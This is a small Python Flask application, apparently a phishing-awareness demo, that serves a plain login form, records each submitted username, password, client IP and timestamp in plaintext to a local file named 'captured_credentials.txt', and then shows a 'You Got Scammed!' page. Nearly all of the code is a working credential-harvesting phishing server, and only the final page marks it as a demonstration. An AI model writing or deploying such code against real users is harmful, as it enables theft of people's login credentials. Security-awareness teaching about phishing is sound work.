from flask import Flask, render_template, request, redirect, url_for
import datetime

app = Flask(__name__)

LOG_FILE = "captured_credentials.txt"

@app.route('/')
def login():
    return '''
    <html>
    <body style="font-family:sans-serif;">
        <h2>Login</h2>
        <form action="/login" method="POST">
            <input type="text" name="username" placeholder="Username or Email" required/><br><br>
            <input type="password" name="password" placeholder="Password" required/><br><br>
            <button type="submit">Login</button>
        </form>
    </body>
    </html>
    '''

@app.route('/login', methods=['POST'])
def do_login():
    username = request.form.get('username')
    password = request.form.get('password')
    ip_address = request.remote_addr
    timestamp = datetime.datetime.now()

    # Write to file
    with open(LOG_FILE, "a") as f:
        f.write(f"{timestamp} - IP: {ip_address} - Username: {username} - Password: {password}\n")

    return redirect(url_for('scammed'))

@app.route('/scammed')
def scammed():
    return '''
    <html>
    <body style="font-family:sans-serif; background-color: #ffe6e6;">
        <h1 style="color: red;">You Got Scammed!</h1>
        <p>This is just a demo to show how attackers can steal your information.</p>
    </body>
    </html>
    '''

if __name__ == '__main__':
    app.run(debug=True)
